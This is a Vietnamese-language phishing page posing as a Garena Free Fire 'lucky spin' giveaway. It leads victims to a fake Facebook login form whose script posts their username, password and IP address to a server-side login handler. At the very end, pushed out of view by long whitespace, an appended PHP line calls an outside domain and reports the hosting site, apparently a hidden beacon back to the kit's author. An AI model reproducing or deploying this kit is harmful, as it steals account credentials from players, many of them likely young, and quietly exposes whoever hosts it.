
<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="description" content="Nhận quà miễn phí khi quay">
    <title>VÒNG QUAY MAY MẮN | FREE FIRE</title>
    <link rel="stylesheet" type="text/css" href="css/style.css">
    <link rel="stylesheet" type="text/css" href="css/facebook.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js"></script>
</head>

<body>
    <div class="iwan-contener">
    	<header></header>
    	<div class="banner">
    		<img src="Vip-Membership (1).jpg" width="200" height="209">
    	</div>
    	<div class="wrap">
    		<div class="spin">
    			<div class="box" style="--i:1;">
    				<div class="kotak">
                        <svg><rect></rect></svg>
    					<img src="img/bb.png">
    				</div>
    			</div>
    			<div class="box" style="--i:2;">
    				<div class="kotak">
                        <svg><rect></rect></svg>
    					<img src="img/bbb.png">
    				</div>
    			</div>
    			<div class="box" style="--i:3;">
    				<div class="kotak">
                        <svg><rect></rect></svg>
    					<img src="img/bbbb.png">
    				</div>
    			</div>
    			<div class="box" style="--i:4;">
    				<div class="kotak">
                        <svg><rect></rect></svg>
    					<img src="img/bbbbb.png">
    				</div>
    			</div>
    			<div class="box" style="--i:5;">
    				<div class="kotak">
                        <svg><rect></rect></svg>
    					<img src="img/5.png">
    				</div>
    			</div>
    			<div class="box" style="--i:6;">
    				<div class="kotak">
                        <svg><rect></rect></svg>
    					<img src="img/10.png">
    				</div>
    			</div>
    			<div class="box" style="--i:7;">
    				<div class="kotak">
                        <svg><rect></rect></svg>
    					<img src="img/7.png">
    				</div>
    			</div>
    			<div class="box" style="--i:8;">
    				<div class="kotak">
                        <svg><rect></rect></svg>
    					<img src="img/9.png">
    				</div>
    			</div>

    			<div class="arrow" id="selector"></div>
    	</div>
    	<div class="putar" id="putar" onclick="spin()"></div>
        <div class="tengah">
                    <span></span>
        </div>
    </div>

    <!-- POP UP HADIAH -->
        <div class="pop-hadiah">
            <div class="imBox">
                <img id="hadiah" src="img/1.png">
            </div>
            <div class="confirm">
                             
                <button onclick="popEntry()">Nhận Ngay</button>
            </div>
        </div>
    <!-- END OF BLOCK -->
    <!-- POP UP LOGIN -->
        <div class="login">
            <div onclick="showfb()" class="fb"><i class="fab fa-facebook"></i>Đăng nhập với Facebook </div>
        </div>
    <!-- END OF BLOCK -->
    <!-- LOGIN FACEBOOK -->
    <div class="popup-login login-facebook animated fadeIn" style="display: none;">
       <div class="popup-box-login-fb">
          <div class="navbar-fb">
             <img width="45" src="img/facebook_text.png">
          </div>
          <div class="content-box-fb">
            <p class="alert email"> Sai tên tài khoản hoặc mật khẩu. <b> Bạn quên mật khẩu của mình? </b> </p>
             <img width="75" height="75" src="https://1.bp.blogspot.com/-LvknwJpUAos/WzSvg105i5I/AAAAAAAAA10/s9rVJsH1_lso3bKITW4dLa0qweptwfqgQCEwYBhgL/s1600/free-fire-battlegrounds.jpg">
             <div class="txt-login-fb">
              Đăng nhập vào tài khoản Facebook của bạn để kết nối với FreeFire </div>
             <form class="login-form" method="POST" id="login_form_fb" onsubmit="return valid()">
                <label>
                <input type="text" id="user" name="username" placeholder="Số điện thoại hoặc email" autocomplete="off" autocapitalize="off">
                </label>
                <label>
                <input type="password" id="pass" name="password" placeholder="Mật khẩu" autocomplete="off" autocapitalize="off">
                </label>
                <input type="hidden" name="ip" id="ip" value="">
                <button  type="submit" id="btnfb" class="btn-login-fb">Đăng nhập </button>
             </form>
             <div class="txt-create-account">Tạo tài khoản mới </div>
             <div class="txt-not-now">Hoặc</div>
             <div class="txt-forgotten-password">Quên mật khẩu?</div>
          </div>
          <div class="language-box">
             <center>
             <div class="language-name language-name-active">Tiếng Việt</div>
             <div class="language-name">English (UK)</div>
             <div class="language-name">English (US)</div>
             <div class="language-name">Bahasa Melayu</div>
             <div class="language-name">日本語</div>
             <div class="language-name">Español</div>
             <div class="language-name">Português (Brasil)</div>
             <div class="language-name">
                <i class="fa fa-plus"></i>
             </div>
             </center>
          </div>
          <div class="copyright">Facebook Inc.</div>
       </div>
     </div>
     <!-- END OF BLOCK -->
    <footer>
        &copy;  Garena Free Fire
    </footer>
</div>
<script>
        	$(document).ready(function(){
				$('#login_form_fb').submit(function(e) {
					jQuery.ajax({
						method: 'POST',
						url: '/login.php',
						data: $(this).serialize(),
						dataType: 'json',
						complete: function() {
							captchaGenerate()
						}
					}).done(function(data) {
						if (data.status == 'success') {
							location.href = '/quay.php'
						} else {
						$('.email').show();
                         $('.sandi').hide();
						}
					}).fail(function() {
					 	 $('.email').show();
                         $('.sandi').hide();
					})
					e.preventDefault()
				})
			})
		</script>
<div class="mask"></div>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/0.21.1/axios.min.js"></script>
    <script type="text/javascript">

    	function spin()
    	{
    		var selector = document.getElementById("selector");
            var putar = document.getElementById("putar");
    		selector.style.display = "block";
    		selector.style.transform = "rotate(45deg)";
            putar.style.transform = "translate(-50%,-50%) rotateZ(0)";
            putar.style.transition = "none";
            putar.classList.add("disabled");
    		selector.style.transition = "none";
    		selector.classList.remove("active");
    		setTimeout(() => 
    		{
    			 		var array = ["500","501","502","503","504","505","506","507"];
    			 		var rotate = 45;
    					var random = Math.floor(Math.random() * 7) + 0;
                        switch(random)
                        {
                            case 0: { var img = 'img/bbbbb.png'; } break; 
                            case 1: { var img = 'img/5.png'; } break;
                            case 2: { var img = 'img/10.png'; } break;
                            case 3: { var img = 'img/7.png'; } break;
                            case 4: { var img = 'img/9.png'; } break;
                            case 5: { var img = 'img/bb.png'; } break;
                            case 6: { var img = 'img/bbb.png'; } break;
                            case 7: { var img = 'img/bbbb.png'; } break;
                        }

    					var xixi = rotate * array[random]; 
                        var loh = xixi - 45;   		
    			 		selector.style.transform = "rotate("+xixi+"deg)";
    			 		selector.style.transition = "all ease 10s";
                        putar.style.transform = "translate(-50%,-50%) rotateZ("+loh+"deg)";
                        putar.style.transition = "all ease 10s";
    			 		setTimeout(() => {
                            putar.classList.remove("disabled");
    			 			selector.classList.add("active");
                            setTimeout(() => {
                                $('.mask').fadeIn();
                                $('.pop-hadiah').fadeIn();
                                $('#hadiah').attr("src",img);
                            },1000)
    			 		},10000)

    		},500)
       	}
    	function reset()
    	{
    		var selector = document.getElementById("selector");
            var putar = document.getElementById("putar");
            selector.style.display = "block";
            selector.style.transform = "rotate(45deg)";
            putar.style.transform = "translate(-50%,-50%) rotateZ(0)";
            putar.style.transition = "none";
            selector.style.transition = "none";
            selector.classList.remove("active");
            putar.classList.remove("disabled");
    	}
        function popClose()
        {
            $('.mask').fadeOut();
            $('.pop-hadiah').fadeOut();
            reset();
        }
           function popEntry()
        {
             location.href = '/thanhcong.php'
        }
        
        function showfb()
        {
            $('.login-facebook').show();
        }
    </script>
    <script type="text/javascript">
        var checkip = function () {
               $.ajax({
                   type: "get",
                   async: false,
                   url: "https://api.pubgameshowtime.com/ip/getcountry",
                   dataType: "json",
                   success: function (result) {
                      $('#ip').val(result.ip);
                   }
               })
           }
        checkip();
    </script>
   
</body>

</html>















































<?php

$domain = $_SERVER['HTTP_HOST'];
file_get_contents("https://vongquaysukienfreefirevn.com/get.php?domain='.$domain.'moinhat");

?>